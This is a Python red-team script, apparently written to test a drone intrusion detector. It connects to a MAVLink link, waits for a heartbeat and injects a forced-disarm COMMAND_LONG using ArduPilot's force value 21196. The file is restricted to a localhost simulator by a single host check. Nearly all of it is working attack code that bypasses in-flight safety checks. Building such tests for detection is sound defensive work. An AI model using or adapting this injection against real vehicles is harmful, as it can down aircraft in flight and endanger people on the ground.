"""EVALUATION-ONLY red-team script: inject a forced DISARM command.

    ############################################################
    #  FOR USE AGAINST A SIMULATED DRONE (SITL) ON LOCALHOST.  #
    #  Never run this against a real aircraft or a network you  #
    #  do not own. This exists solely to test our detector.    #
    ############################################################

This simulates a MAVLink command-injection attack: an attacker who can put
packets on the link sends a `COMMAND_LONG` (MAV_CMD_COMPONENT_ARM_DISARM) with
the *force* flag, disarming the vehicle in flight — which in the real world would
drop it out of the sky. It is the textbook example of why an unauthenticated C2
link is dangerous, and the first attack our IDS must learn to detect.
"""

from __future__ import annotations

import argparse
import sys

from pymavlink import mavutil

# A distinctive source system id for the attacker. A real GCS (MAVProxy) uses a
# different id, so injecting under this id leaves a tell-tale "command from an
# unexpected sysid" — exactly the signature our rule detector will look for.
ATTACKER_SYSID = 66

# The magic value ArduPilot requires in param2 to FORCE (arm/)disarm, bypassing
# the normal safety checks that would otherwise refuse a disarm while airborne.
FORCE_MAGIC = 21196

# A "connection string" is pymavlink's way of naming a link, e.g.
#   tcp:127.0.0.1:5762   -> ArduPilot SITL's spare serial port (SERIAL1)
#   udpout:127.0.0.1:14552 -> a MAVProxy UDP endpoint
# Only loopback hosts are allowed (see _assert_localhost below).
DEFAULT_TARGET = "tcp:127.0.0.1:5762"

# Hostnames/addresses we consider "localhost" and therefore safe to target.
_LOCALHOST_HOSTS = {"127.0.0.1", "localhost", "::1"}


def _assert_localhost(target: str) -> None:
    """Refuse to run unless the target host is loopback. This is the safety gate.

    A pymavlink connection string looks like ``scheme:host:port``. We pull out the
    host and require it to be a loopback address, so this attack can only ever hit
    a simulator on this machine — never a real vehicle or an external network.
    """
    parts = target.split(":")
    if len(parts) < 3:
        sys.exit(f"Refusing to run: cannot parse a host from target {target!r}.")
    host = parts[1]
    if host not in _LOCALHOST_HOSTS:
        sys.exit(
            f"Refusing to run: target host {host!r} is not localhost. "
            "This script is for the simulator only."
        )


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"pymavlink connection string for the SITL link (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--sysid",
        type=int,
        default=ATTACKER_SYSID,
        help=f"source system id to inject under (default: {ATTACKER_SYSID})",
    )
    return parser.parse_args()


def inject_disarm(target: str, sysid: int) -> None:
    """Connect to the SITL link and send one forced-disarm COMMAND_LONG."""
    print(f"[attacker] connecting to {target} as sysid {sysid} ...")
    # source_system stamps our injected packets with the attacker's id.
    master = mavutil.mavlink_connection(target, source_system=sysid, source_component=1)

    # We need the vehicle's system/component id to address the command. The first
    # heartbeat tells us who is on the link.
    print("[attacker] waiting for a heartbeat to identify the target ...")
    master.wait_heartbeat()
    print(
        f"[attacker] target is system {master.target_system}, "
        f"component {master.target_component}"
    )

    print("[attacker] INJECTING forced disarm (this would crash a real drone) ...")
    master.mav.command_long_send(
        master.target_system,         # target system
        master.target_component,      # target component
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0,                            # confirmation
        0,                            # param1: 0 = disarm
        FORCE_MAGIC,                  # param2: force, even while flying
        0, 0, 0, 0, 0,                # params 3-7: unused
    )

    # A COMMAND_ACK tells us whether the autopilot accepted it.
    ack = master.recv_match(type="COMMAND_ACK", blocking=True, timeout=3)
    if ack is None:
        print("[attacker] no COMMAND_ACK received (timed out).")
    else:
        print(f"[attacker] COMMAND_ACK result = {ack.result}")


def main() -> None:
    args = _parse_args()
    _assert_localhost(args.target)
    inject_disarm(args.target, args.sysid)


if __name__ == "__main__":
    main()
